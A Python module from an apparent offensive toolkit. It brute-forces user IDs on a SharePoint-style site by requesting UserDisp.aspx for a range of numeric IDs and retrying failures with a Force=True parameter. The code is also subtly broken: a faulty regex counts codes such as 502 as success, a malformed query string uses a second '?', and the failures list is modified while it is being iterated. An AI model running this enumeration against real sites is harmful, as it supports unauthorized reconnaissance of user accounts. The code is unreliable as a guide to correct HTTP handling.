import logging
import re
import sys

import requests
import url_processor

__author__ = '0rigen'
__email__ = "0rigen@0rigen.net"
__status__ = "Development"

# TODO:
# This checks for successful web requests, but will likely need to actually read the page
# and identify if valid data was returned or not.  It may just return a 'successful' but blank
# page if permissions are properly set.

red = "\033[31m"  # usually for errors, [X] items
cyan = "\033[36m"
yellow = "\033[33m"  # usually for information and requests, the [?] items
green = "\033[92m"  # Information and success, [!]
blue = "\033[94m"
endc = "\033[0m"
bold = "\033[1m"
underline = "\033[4m"


####################################
#      enumusers()                 #
# @start - Integer starting value  #
# @end - Integer ending value      #
####################################
def enumusers(target, start=None, end=None):
    results = []  # Results Container
    failures = []  # Failure Container to retry with Force

    if start is None:  # Assign default Start and End values
        start = 1
        sys.stdout.write(yellow + "[!] No start value provided, starting at UID=%d" % start + endc)
        sys.stdout.write("\n")
    if end is None:
        end = 10
        sys.stdout.write(yellow + "[!] No stop value provided, stopping at UID=%d" % end + endc)
        sys.stdout.write("\n")

    # Ensure proper target specification
    target = url_processor.checkhttp(target[0], target[1])  # Check traget formatting

    # Begin requesting pages
    for i in range(start, end):  # From start to end...

        r = target + "/UserDisp.aspx?ID=" + str(i)  # Compiled request string
        sys.stdout.write(yellow + "\r[...] Trying %s" % r + endc)

        try:
            page = requests.get(r)  # Open the page
            code_match = re.search("[2**]", str(page.status_code))  # Check for success code 2xx
            if code_match is not None:
                results.append(i)  # Add to results if successful
                sys.stdout.flush()
            else:
                failures.append(i)  # Add to Failures to retry with Force
                sys.stdout.flush()
        except:  # Handle things that go badly...
            sys.stdout.write(red + "\n[X] Unexpected Error in enumusers()\n" + endc)

    sys.stdout.write(yellow + "\n[!] Re-attempting failed IDs with the Force parameter set to True..." + endc)
    sys.stdout.write("\n")

    # Re-request all users with ?Force = True
    for user in failures:

        r = target + "/UserDisp.aspx?ID=" + str(user) + "?Force=True"  # Request string with True parameter
        sys.stdout.write(yellow + "\r[...] Retrying %s" % r + endc)

        try:
            page = requests.get(r)  # Open the page
            code_match = re.search("[2**]", str(page.status_code))  # Check for success code 2xx
            if code_match is not None:
                results.append(user)  # Add to results if successful, remove from Failures
                failures.remove(user)
            else:
                pass
        except:  # Handle things that go badly...
            sys.stdout.write(red + "\n[X] Unexpected Error in enumusers(), failures loop" + endc)

        sys.stdout.flush()

    logging.info("UserID Brute Force Completed.")
    sys.stdout.write("\n")

    return results  # Return array of successful IDs
